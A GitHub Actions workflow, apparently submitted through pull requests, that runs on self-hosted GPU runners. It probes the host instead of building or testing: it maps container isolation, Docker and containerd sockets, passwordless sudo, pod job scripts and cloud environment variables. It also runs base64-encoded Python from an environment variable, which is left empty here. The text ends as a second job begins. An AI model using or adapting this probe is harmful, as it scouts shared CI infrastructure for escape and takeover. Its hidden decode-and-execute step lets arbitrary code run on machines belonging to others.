name: c211-i124746-ident
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  ident-4xb200:
    runs-on: 4-gpu-b200
    timeout-minutes: 15
    steps:
      - name: identity
        env:
          NONCE: c211-i124746-0556383014448558
          C211_PY: 
        run: |
          set -u
          echo "C211_IDENT_BEGIN job=ident-4xb200 nonce=$NONCE"
          echo "C211_MARKER job=ident-4xb200 nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
          id || true
          uname -a || true
          echo "--- proc1 ---"
          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1 | head -1)"
          echo "--- cgroup ---"
          head -20 /proc/1/cgroup 2>&1 || true
          echo "--- container files ---"
          ls -la /.dockerenv /run/.containerenv 2>&1 || true
          echo "--- detect-virt ---"
          systemd-detect-virt --container 2>&1 || echo "SDDV_CONTAINER_NONE"
          systemd-detect-virt 2>&1 || echo "SDDV_NONE"
          echo "--- mountinfo ---"
          grep -E ' /(proc|sys|etc/hosts|etc/resolv.conf|dev/termination-log) ' /proc/self/mountinfo 2>/dev/null | head -8 || true
          echo "--- sockets ---"
          for s in /run/docker.sock /var/run/docker.sock /run/containerd/containerd.sock /var/run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock; do if [ -S "$s" ]; then echo "SOCK_PRESENT $s mode=$(stat -c '%a %U %G' "$s" 2>/dev/null)"; else echo "SOCK_ABSENT $s"; fi; done
          echo "--- sudo ---"
          sudo -n id 2>&1 | head -3 || echo "SUDO_NONINTERACTIVE_DENIED"
          echo "--- podinfo ---"
          ls -la /etc/podinfo 2>&1 | head -15 || true
          cat /etc/podinfo/arc-job-started.sh 2>&1 | head -60 || true
          echo "--- env identity ---"
          env | grep -E '^(KUBERNETES_|AWS_|AZURE_|GOOGLE_|GCLOUD_|CLOUD_|RUNNER_|ACTIONS_|IMAGE_|HOSTNAME=)' | sed -E 's/^([A-Z0-9_]*(TOKEN|KEY|SECRET|PASSWORD|PASS|CRED)[A-Z0-9_]*)=.*/\1=<redacted>/' | sort | head -40 || true
          echo "--- python identity probe ---"
          if command -v python3 >/dev/null 2>&1; then python3 -c "import base64;exec(base64.b64decode('$C211_PY').decode())" || echo "PY_IDENT_FAILED"; else echo "PY3_MISSING"; fi
          echo "C211_IDENT_END job=ident-4xb200 nonce=$NONCE"
  ident-mi300-8:
    runs-on: linux-mi300-8gpu-sglang
    timeout-minutes: 15
    steps:
      - name: identity
        env:
          NONCE: c211-i124746-0556383014448558
